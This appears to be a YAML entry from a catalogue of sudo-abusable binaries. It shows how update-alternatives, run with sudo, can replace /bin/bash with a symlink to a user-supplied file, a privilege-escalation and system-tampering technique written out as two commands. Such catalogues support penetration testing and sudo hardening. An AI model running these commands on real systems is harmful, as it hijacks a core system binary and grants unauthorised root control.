---
functions:
  sudo:
    - description: Replace existing binary with symlink pointing to user supplied binary
      code: |
        cp file_to_replace_bash /tmp/bash
        sudo update-alternatives --force --install /bin/bash bash /tmp/bash 1
---
